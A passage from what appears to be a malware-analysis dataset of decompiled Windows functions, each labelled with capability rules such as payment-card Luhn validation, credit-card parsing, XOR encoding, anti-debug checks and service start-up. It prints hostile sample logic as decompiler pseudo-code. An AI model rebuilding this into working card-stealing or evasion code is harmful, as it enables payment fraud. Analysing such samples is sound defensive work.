        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004034ce)\n// WARNING: Removing unreachable block (ram,0x004034d6)\n\nuint __cdecl fcn.00403470(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t arg_8h_00;\n    int32_t iVar1;\n    uint var_4h;\n    \n    *0x4214e4 = fcn.00401ef0();\n    arg_8h_00 = (*_sym.imp.KERNEL32.dll_CreateFileA)(arg_8h, 0x40000000, 1, 0, 2, 0x80, 0);\n    if (arg_8h_00 == -1) {\n        return 0;\n    }\n    iVar1 = (*_sym.imp.KERNEL32.dll_WriteFile)(arg_8h_00, arg_ch, arg_10h, &var_4h, 0);\n    if (iVar1 != 0) {\n        if (*0x4214e4 != 0) {\n            iVar1 = fcn.004033c0(arg_8h_00);\n            *0x4214e4 = iVar1 == 0;\n        }\n        fcn.004013d0(0, arg_8h_00);\n        if (*0x4214e4 == 0) {\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(arg_8h_00);\n        }\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 335
    },
    "00404820": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint fcn.00404820(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00401eb0(0x411044);\n    if (iVar1 != -1) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 74
    },
    "004016d0": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nint32_t __cdecl fcn.004016d0(uint32_t arg_8h, uint16_t *arg_ch, int32_t arg_10h)\n\n{\n    if (arg_10h == 0) {\n        return (arg_8h >> 0x10) + arg_8h;\n    }\n    do {\n        arg_8h = arg_8h + *arg_ch;\n        if (arg_8h >> 0x10 != 0) {\n            arg_8h = (arg_8h >> 0x10) + (arg_8h & 0xffff);\n        }\n        arg_ch = arg_ch + 1;\n        arg_10h = arg_10h + -1;\n    } while (arg_10h != 0);\n    return (arg_8h >> 0x10) + arg_8h;\n}\n",
        "token_count": 206
    },
    "00401900": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid fcn.00401900(uint param_1)\n\n{\n    uint uStack48;\n    uint uStack44;\n    code *pcStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack48 = 0x30;\n    uStack44 = 3;\n    pcStack40 = fcn.00401960;\n    uStack36 = 0;\n    uStack32 = 0;\n    uStack28 = param_1;\n    uStack24 = 0;\n    uStack20 = 0;\n    uStack16 = 0;\n    uStack12 = 0;\n    uStack8 = 0x411040;\n    uStack4 = 0;\n    (*_sym.imp.USER32.dll_RegisterClassExA)(&uStack48);\n    return;\n}\n",
        "token_count": 216
    },
    "00401d20": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00401d20(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    code *pcVar1;\n    uint arg_ch_00;\n    uint arg_ch_01;\n    uint arg_ch_02;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_314h;\n    uint var_210h;\n    uchar lpBuffer;\n    uint var_10bh;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    lpBuffer = 0;\n    puVar3 = &var_10bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    var_8h = 0;\n    *(puVar3 + 2) = 0;\n    fcn.004041d0();\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(*0x10 + -0x110, 4);\n    var_4h = 0;\n    do {\n        arg_ch_00 = fcn.00401e80();\n        arg_ch_01 = fcn.00401e80();\n        arg_ch_02 = fcn.00401e80();\n        fcn.00404ad0(arg_10h, arg_ch_00);\n        fcn.00404ad0(arg_8h, arg_ch_01);\n        fcn.00404ad0(arg_ch, arg_ch_02);\n        pcVar1 = _sym.imp.MSVCRT.dll_sprintf;\n        (*_sym.imp.MSVCRT.dll_sprintf)(&var_314h, 0x411058, &lpBuffer, arg_10h);\n        iVar2 = fcn.004021e0(&var_314h);\n        if (iVar2 != 0) {\n            (*pcVar1)(&var_210h, 0x411064, &lpBuffer, arg_8h);\n            iVar2 = fcn.004021e0(&var_210h);\n            if (iVar2 != 0) {\n                (*pcVar1)(&var_210h, 0x411064, &lpBuffer, arg_ch);\n                iVar2 = fcn.004021e0(&var_210h);\n                if (iVar2 != 0) {\n                    iVar2 = 1;\n                    break;\n                }\n            }\n        }\n        var_4h = var_4h + 1;\n        iVar2 = var_8h;\n    } while (var_4h < 3);\n    fcn.00404ad0(arg_14h, 4);\n    return iVar2 != 0;\n}\n",
        "token_count": 620
    },
    "00403fb0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00403fc5) overlaps instruction at (ram,0x00403fc3)\n// \n// WARNING: Removing unreachable block (ram,0x00404007)\n// WARNING: Removing unreachable block (ram,0x00404014)\n// WARNING: Removing unreachable block (ram,0x00403fc5)\n// WARNING: Could not reconcile some variable overlaps\n\nunkbyte10 fcn.00403fb0(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    int32_t extraout_ECX;\n    int32_t iVar5;\n    uint unaff_EBX;\n    uint *puVar6;\n    unkbyte10 extraout_ST0;\n    unkbyte10 extraout_ST0_00;\n    unkbyte10 extraout_ST0_01;\n    unkbyte10 Var7;\n    uchar var_260h;\n    uint var_25fh;\n    uchar s;\n    uint var_15bh;\n    uint var_58h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_14h;\n    uint hProcess;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00402f30();\n    iVar4 = fcn.004037a0();\n    Var7 = extraout_ST0;\n    if (iVar4 != 0) {\n        var_260h = 0;\n        puVar6 = &var_25fh;\n        for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {\n            *puVar6 = 0;\n            puVar6 = puVar6 + 1;\n        }\n        *puVar6 = 0;\n        *(puVar6 + 2) = 0;\n        iVar4 = (*_sym.imp.SHELL32.dll_SHGetSpecialFolderPathA)(0, &var_260h, 0x26, 0);\n        Var7 = extraout_ST0_00;\n        if (iVar4 != 0) {\n            if ((iVar4 < 0) || (iVar5 = extraout_ECX,  iVar4 >= 0)) {\n                fcn.004041d0();\n                iVar5 = 0x40;\n            }\n            *(iVar5 + 0x40) = *(iVar5 + 0x40) + (unaff_EBX >> 8);\n            s = 0;\n            puVar6 = &var_15bh;\n            for (; iVar5 != 0; iVar5 = iVar5 + -1) {\n                *puVar6 = 0;\n                puVar6 = puVar6 + 1;\n            }\n            *puVar6 = 0;\n            *(puVar6 + 2) = 0;\n            (*_sym.imp.MSVCRT.dll_sprintf)(&s, 0x4113e0, &var_260h, 0x4113c0, 3);\n            pcVar3 = _sym.imp.USER32.dll_EnumWindows;\n            pcVar2 = _sym.imp.KERNEL32.dll_Sleep;\n            var_14h = 0;\n            do {\n                puVar6 = &var_58h;\n                for (iVar4 = 0x11; iVar4 != 0; iVar4 = iVar4 + -1) {\n                    *puVar6 = 0;\n                    puVar6 = puVar6 + 1;\n                }\n                var_28h._0_2_ = 0;\n                hProcess = 0;\n                var_ch = 0;\n                var_58h = 0x44;\n                var_8h = 0;\n                var_2ch = 1;\n                var_4h = 0;\n                iVar4 = (*_sym.imp.KERNEL32.dll_CreateProcessA)(0, &s, 0, 0, 0, 0, 0, 0, &var_58h, &hProcess);\n                if (iVar4 == 0) {\n                    return extraout_ST0_01;\n                }\n                (*pcVar2)(3000);\n                (*pcVar3)(fcn.00403ea0, var_8h);\n                iVar4 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(hProcess, 1000);\n                if (iVar4 == 0x102) {\n                    (*_sym.imp.KERNEL32.dll_TerminateProcess)(hProcess, 1);\n                }\n                pcVar1 = _sym.imp.KERNEL32.dll_CloseHandle;\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(var_ch);\n                Var7 = (*pcVar1)(hProcess);\n                var_14h = var_14h + 1;\n            } while (var_14h < 1);\n        }\n    }\n    return Var7;\n}\n",
        "token_count": 1075
    },
    "004035a0": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x004035fb) overlaps instruction at (ram,0x004035fa)\n// \n// WARNING: Removing unreachable block (ram,0x0040368f)\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __cdecl fcn.004035a0(uint32_t *arg_8h, int32_t arg_ch, uint32_t arg_10h, uint32_t arg_14h, int32_t arg_18h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t in_EDX;\n    uint32_t uVar3;\n    uint8_t unaff_BL;\n    uint32_t unaff_ESI;\n    int32_t unaff_EDI;\n    bool bVar4;\n    bool bVar5;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    var_8h = 0;\n    if (0 < arg_14h) {\n        var_ch = 1;\n        uVar3 = arg_14h * 2;\n        do {\n            uVar2 = uVar3 & 0xffff0000 | CONCAT11((uVar3 >> 8) - unaff_BL, uVar3);\n            bVar5 = SBORROW4(uVar2, in_EDX);\n            bVar4 = uVar2 - in_EDX < 0;\n            uVar3 = arg_10h;\n            iVar1 = var_ch;\n            if (in_EDX <= uVar2) {\n                do {\n                    uVar2 = uVar3;\n                    iVar1 = var_ch;\n                    if (bVar5 == bVar4) break;\n                    bVar5 = false;\n                    bVar4 = &stack0xffffffe0 < 0;\n                    uVar3 = unaff_ESI;\n                    unaff_ESI = uVar2;\n                    iVar1 = unaff_EDI;\n                } while (!bVar4);\n            }\n            unaff_EDI = iVar1;\n            unaff_BL = *(unaff_EDI % arg_ch + arg_8h);\n            bVar4 = 0x222b < (unaff_ESI & 0xffff0000 | unaff_ESI + 1);\n            if ((bVar4) && (!bVar4)) {\n                if (&stack0xffffffe0 < *arg_8h || arg_8h == 0xffffffff) {\n    // WARNING: Bad instruction - Truncating control flow here\n                    halt_baddata();\n                }\n                do {\n    // WARNING: Do nothing block with infinite loop\n                } while( true );\n            }\n            uVar3 = (unaff_EDI + -1) % arg_ch;\n            var_10h._0_1_ = arg_14h * 2;\n            *(arg_18h + -1 + unaff_EDI) = var_10h ^ *(var_8h + arg_10h) ^ *(uVar3 + arg_8h);\n            in_EDX = uVar3 & 0xffffff00 | var_10h ^ unaff_BL;\n            *(var_ch + arg_18h) = var_10h ^ unaff_BL;\n            var_ch = var_ch + 2;\n            var_8h = var_8h + 1;\n            uVar3 = arg_14h;\n        } while (var_8h < arg_14h);\n    }\n    return;\n}\n",
        "token_count": 796
    },
    "004037a0": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403825) overlaps instruction at (ram,0x00403824)\n// \n\nbool fcn.004037a0(void)\n\n{\n    uchar *puVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    bool bVar4;\n    uchar pvData;\n    uint var_10bh;\n    uint pdwType;\n    uint pcbData;\n    \n    pvData = 0;\n    puVar3 = &var_10bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    pcbData = 0x104;\n    *(puVar3 + 2) = 0;\n    puVar1 = (*_sym.imp.SHLWAPI.dll_SHGetValueA)(0x80000002, 0x411494, 0x4114bc, &pdwType, &pvData, &pcbData);\n    bVar4 = (POPCOUNT(puVar1 & 0xff) & 1U) == 0;\n    if (puVar1 != NULL) {\n        return false;\n    }\n    if ((bVar4) || (!bVar4)) {\n        puVar1 = &pvData;\n    }\n    puVar1 = (*_sym.imp.MSVCRT.dll_strchr)(puVar1, 0x2e);\n    if (puVar1 == NULL) {\n        return false;\n    }\n    *puVar1 = 0;\n    iVar2 = (*_sym.imp.MSVCRT.dll_atoi)(&pvData);\n    if (iVar2 == 6) {\n        return true;\n    }\n    return iVar2 == 7;\n}\n",
        "token_count": 405
    },
    "004010a0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x004011e6) overlaps instruction at (ram,0x004011e5)\n// \n// WARNING: Removing unreachable block (ram,0x004010f1)\n// WARNING: Removing unreachable block (ram,0x004011b9)\n\nulong __cdecl fcn.004010a0(uchar *arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    uint in_EAX;\n    uint uVar2;\n    char in_CL;\n    uint in_EDX;\n    uint32_t unaff_EBX;\n    uint *puVar3;\n    uint *puVar4;\n    int32_t unaff_EDI;\n    int32_t iVar5;\n    bool bVar6;\n    bool in_SF;\n    bool bVar7;\n    float10 in_ST0;\n    float10 in_ST1;\n    uint auStack24 [2];\n    \n    puVar4 = &stack0xfffffffc;\n    if ((!in_SF) && (in_SF)) {\n        *(unaff_EDI + 0x1c) = in_ST0;\n        in_ST0 = in_ST1;\n    }\n    *arg_8h = 0xbe;\n    bVar6 = (POPCOUNT(in_CL - 5U & 0x44) & 1U) == 0;\n    arg_8h[1] = 0x84;\n    arg_8h[2] = 0x23;\n    if ((bVar6) || (!bVar6)) {\n        arg_8h[3] = 0x1e;\n    }\n    else {\n        puVar4 = *0xc617b43a;\n        arg_8h = 0x34a96cf5;\n        unaff_EBX = unaff_EBX + *0x34a96cf5;\n        in_EDX = in_EAX;\n    }\n    arg_8h[4] = 0x99;\n    bVar6 = (POPCOUNT(in_EDX & 0x66) & 1U) == 0;\n    arg_8h[5] = 0x18;\n    if ((bVar6) || (!bVar6)) {\n        arg_8h[6] = 0x36;\n    }\n    iVar5 = puVar4[2];\n    *(iVar5 + 7) = 0xb6;\n    *(iVar5 + 8) = 0x99;\n    cVar1 = -0x67;\n    iVar5 = puVar4[2];\n    *(iVar5 + 9) = 0xfa;\n    *(iVar5 + 10) = 0x29;\n    bVar7 = SCARRY4(unaff_EBX, 1);\n    bVar6 = (POPCOUNT(unaff_EBX + 1 & 0xff) & 1U) == 0;\n    *(iVar5 + 0xb) = 0x55;\n    if ((bVar6) || (!bVar6)) {\n        *(iVar5 + 0xc) = 0x96;\n    }\n    else {\n        bVar7 = false;\n        cVar1 = -0x61;\n    }\n    if ((!bVar7) && (bVar7)) {\n        LOCK();\n        cVar1 = cVar1 + '\\x7f';\n    }\n    *(iVar5 + 0xd) = 0xb3;\n    bVar6 = -1 < cVar1 + -1;\n    *(iVar5 + 0xe) = 0x2f;\n    if ((bVar6) && (!bVar6)) {\n        *(iVar5 + 0x1c) = in_ST0;\n        iVar5 = iVar5 + 5;\n    }\n    *(iVar5 + 0xf) = 0xf1;\n    bVar6 = (POPCOUNT((unaff_EBX & 0xffff) + 1 & 0xff) & 1U) != 0;\n    *(iVar5 + 0x10) = 0;\n    if ((bVar6) && (!bVar6)) {\n        puVar3 = auStack24 + 1;\n        cVar1 = '\\x1e';\n        do {\n            puVar4 = puVar4 + -1;\n            puVar3 = puVar3 + -1;\n            *puVar3 = *puVar4;\n            cVar1 = cVar1 + -1;\n        } while ('\\0' < cVar1);\n        uVar2 = in(0x78);\n        return CONCAT44(in_EDX, uVar2);\n    }\n    *(iVar5 + 0x11) = 2;\n    *(iVar5 + 0x12) = 0xde;\n    puVar4 = puVar4[3];\n    *puVar4 = 0x13;\n    return CONCAT44(in_EDX, puVar4);\n}\n",
        "token_count": 1074
    },
    "004013d0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.004013d0(uint noname_0, int32_t arg_ch)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    char *pcVar6;\n    char *pcVar7;\n    char *pcVar8;\n    uint *puVar9;\n    char lpBuffer;\n    uint var_22fh;\n    uchar var_12ch;\n    uint var_12bh;\n    uint var_28h;\n    uchar auStack40 [8];\n    uchar auStack32 [8];\n    uchar auStack24 [16];\n    int32_t var_4h;\n    \n    var_4h = arg_ch;\n    lpBuffer = '\\0';\n    puVar5 = &var_22fh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    var_12ch = '\\0';\n    puVar5 = &var_12bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)();\n    uVar3 = 0xffffffff;\n    pcVar7 = &lpBuffer;\n    do {\n        pcVar6 = pcVar7;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar6 = pcVar7 + 1;\n        cVar1 = *pcVar7;\n        pcVar7 = pcVar6;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    puVar5 = pcVar6 + -uVar3;\n    puVar9 = &var_12ch;\n    for (uVar4 = uVar3 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {\n        *puVar9 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar9 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    uVar3 = 0xffffffff;\n    pcVar7 = 0x41107c;\n    do {\n        pcVar6 = pcVar7;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar6 = pcVar7 + 1;\n        cVar1 = *pcVar7;\n        pcVar7 = pcVar6;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    iVar2 = -1;\n    pcVar7 = &var_12ch;\n    do {\n        pcVar8 = pcVar7;\n        if (iVar2 == 0) break;\n        iVar2 = iVar2 + -1;\n        pcVar8 = pcVar7 + 1;\n        cVar1 = *pcVar7;\n        pcVar7 = pcVar8;\n    } while (cVar1 != '\\0');\n    puVar5 = pcVar6 + -uVar3;\n    puVar9 = pcVar8 + -1;\n    for (uVar4 = uVar3 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {\n        *puVar9 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar9 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    (*_sym.imp.KERNEL32.dll_GetFileAttributesExA)(&var_12ch, 0, &var_28h);\n    iVar2 = var_4h;\n    if ((arg_ch == -1) && (iVar2 = fcn.00401eb0(noname_0),  iVar2 == -1)) {\n        return 0;\n    }\n    (*_sym.imp.KERNEL32.dll_SetFileTime)(iVar2, auStack40, auStack32, auStack24);\n    if (arg_ch == -1) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n    }\n    return 1;\n}\n",
        "token_count": 1155
    },
    "00401540": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00401540(uint arg_8h, uint arg_ch)\n\n{\n    uint in_EAX;\n    char *arg_8h_00;\n    uint uVar1;\n    char in_CL;\n    int32_t extraout_ECX;\n    int32_t unaff_EBX;\n    uint unaff_EDI;\n    uint8_t in_AF;\n    bool bVar2;\n    char cVar3;\n    char cVar4;\n    uint var_24h;\n    uint var_1ch;\n    uint *var_14h;\n    uint *puStack20;\n    uint uStack16;\n    \n    cVar4 = '\\0';\n    cVar3 = '\\0';\n    bVar2 = (CONCAT11((in_EAX >> 8) - in_CL, in_EAX + '\\x01') - 1U & 0x637b) == 0;\n    uStack16 = 0xf003f;\n    puStack20 = NULL;\n    var_14h = NULL;\n    arg_8h_00 = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)();\n    if ((!bVar2 && cVar4 == cVar3) && (bVar2 || cVar4 != cVar3)) {\n        if (extraout_ECX != 0) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n        *arg_8h_00 = ((arg_8h_00 & 0xffff) >> 8) + (9 < (arg_8h_00 & 0xffff & 0xf) | in_AF);\n        puStack20 = &var_14h;\n        var_14h = &var_1ch;\n        var_1ch._0_1_ = unaff_EDI;\n        var_1ch._1_1_ = unaff_EDI >> 8;\n        var_1ch._2_2_ = unaff_EDI >> 0x10;\n        (*_sym.imp.KERNEL32.dll_SetFileTime)();\n        if (unaff_EBX == -1) {\n            (*_sym.imp.KERNEL32.dll_CloseHandle)();\n        }\n        return 1;\n    }\n    var_1ch._0_1_ = SUB41(arg_8h_00, 0);\n    var_1ch._1_1_ = arg_8h_00 >> 8;\n    var_1ch._2_2_ = arg_8h_00 >> 0x10;\n    fcn.00401350();\n    var_1ch._0_1_ = arg_8h;\n    var_1ch._1_1_ = arg_8h >> 8;\n    var_1ch._2_2_ = arg_8h >> 0x10;\n    uVar1 = fcn.00404fe0(arg_8h_00, arg_8h, arg_ch);\n    var_1ch._0_1_ = 0xbb;\n    var_1ch._1_1_ = 0x15;\n    var_1ch._2_2_ = 0x40;\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)();\n    return uVar1;\n}\n",
        "token_count": 732
    },
    "004015d0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "get session user name"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004016b9) overlaps instruction at (ram,0x004016b4)\n// \n// WARNING: Removing unreachable block (ram,0x00401624)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.004015d0(uint StringSid)\n\n{\n    int32_t iVar1;\n    uint var_31ch;\n    uint lpBuffer;\n    uint Sid;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_ch = 0x104;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_GetUserNameA)(&lpBuffer, &var_ch);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    var_4h = 0x104;\n    var_8h = 0x104;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_LookupAccountNameA)(0, &lpBuffer, &Sid, &var_4h, &var_31ch, &var_8h, &var_10h);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    iVar1 = (*_sym.imp.ADVAPI32.dll_ConvertSidToStringSidA)(&Sid, StringSid);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 318
    },
    "00401960": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __cdecl fcn.00401960(uint arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    if (arg_ch == 1) {\n        fcn.004025d0();\n        fcn.00403230();\n        fcn.00403fb0();\n        if (*0x4214e4 == 0) {\n            (*_sym.imp.USER32.dll_PostQuitMessage)(0);\n            fcn.00401b10();\n        }\n    }\n    (*_sym.imp.USER32.dll_DefWindowProcA)(arg_8h, arg_ch, arg_10h, arg_14h);\n    return;\n}\n",
        "token_count": 162
    },
    "00401a30": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401a30(uint hSCManager, uint lpServiceName)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar2 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)(hSCManager, lpServiceName, 0xf01ff);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    iVar3 = (*_sym.imp.ADVAPI32.dll_StartServiceA)(iVar2, 0, 0);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetLastError;\n    if (iVar3 == 0) {\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (iVar3 != 0x420) {\n            iVar3 = (*pcVar1)();\n            if (iVar3 != 0x422) {\n                (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n                return 0;\n            }\n        }\n    }\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n    return 1;\n}\n",
        "token_count": 242
    },
    "00401fe0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "encode data using XOR"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401fe0(int32_t arg_8h, uint32_t arg_ch, int32_t arg_10h, uint32_t arg_14h)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = 0;\n    if (arg_14h != 0) {\n        do {\n            *(uVar1 + arg_10h) = *(uVar1 + arg_10h) ^ *(uVar1 % arg_ch + arg_8h);\n            uVar1 = uVar1 + 1;\n        } while (uVar1 < arg_14h);\n    }\n    return;\n}\n",
        "token_count": 141
    },
    "00402f30": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00403103) overlaps instruction at (ram,0x00403102)\n// \n\nuint fcn.00402f30(void)\n\n{\n    uint8_t uVar1;\n    uint *puVar2;\n    uint8_t in_AL;\n    uint32_t *puVar3;\n    char extraout_CL;\n    char cVar4;\n    uint8_t extraout_CL_00;\n    char extraout_DH;\n    int32_t unaff_EBX;\n    uint *puVar5;\n    uint *puVar6;\n    uint *puVar7;\n    int32_t unaff_ESI;\n    uint32_t uVar8;\n    uint8_t *unaff_EDI;\n    uchar uVar9;\n    uint8_t in_AF;\n    uchar uVar10;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    bool bVar11;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    uint32_t uVar12;\n    float10 fVar13;\n    ulong uVar14;\n    uchar auStack24175 [24043];\n    uchar *puStack132;\n    uint uStack68;\n    uint *puStack64;\n    uint uVar15;\n    \n    cVar4 = in_AL - *unaff_EDI;\n    uVar12 = (in_NT & 1) * 0x4000 | SBORROW1(in_AL, *unaff_EDI) * 0x800 | (in_IF & 1) * 0x200 | (in_TF & 1) * 0x100 |\n             (cVar4 < '\\0') * 0x80 | (cVar4 == '\\0') * 0x40 | (in_AF & 1) * 0x10 | ((POPCOUNT(cVar4) & 1U) == 0) * 4 |\n             in_AL < *unaff_EDI | (in_ID & 1) * 0x200000 | (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 |\n             (in_AC & 1) * 0x40000;\n    uVar8 = unaff_ESI - 1;\n    uVar14 = func_0x10188ebd();\n    puVar6 = (uVar14 >> 0x20) + 0x20;\n    fcn.00404b30(0x411030, 0xd, 0x4113c0, uVar12);\n    fcn.00404b30(0x411030, 0xd, 0x4113e0, 0x26);\n    fcn.00404b30(0x411030, 0xd, 0x411408, 8);\n    fcn.00404b30(0x411030, 0xd, 0x411410, 0x19);\n    bVar11 = SBORROW1(extraout_DH, extraout_CL);\n    uVar15 = 0x402fdf;\n    fcn.00404b30(0x411030, 0xd, 0x41142c, 0xb);\n    if ((bVar11) || (!bVar11)) {\n        uVar15 = 0x12;\n    }\n    fcn.00404b30(0x411030, 0xd, 0x411438, uVar15);\n    fcn.00404b30(0x411030, 0xd, 0x41144c, 0x12);\n    fcn.00404b30(0x411030, 0xd, 0x411460, 2);\n    fcn.00404b30(0x411030, 0xd, 0x411464, 8);\n    bVar11 = (uVar8 & 0xffff0000 | uVar8 + 1) 